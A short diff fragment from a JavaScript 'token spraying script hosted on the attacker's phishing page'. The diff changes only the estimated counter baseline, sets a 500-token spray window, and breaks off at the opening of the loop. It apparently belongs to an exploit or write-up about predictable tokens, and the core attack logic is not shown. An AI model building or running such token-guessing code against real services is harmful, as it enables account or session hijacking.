@@ -1,5 +1,5 @@
 // Token spraying script hosted on the attacker's phishing page 
-const START = 8974; // Estimated global counter baseline 
+const START = 7429; // Estimated global counter baseline 
 const COUNT = 500;  // Spray window size 
  
 for (let i = 0; i < COUNT; i++) { 
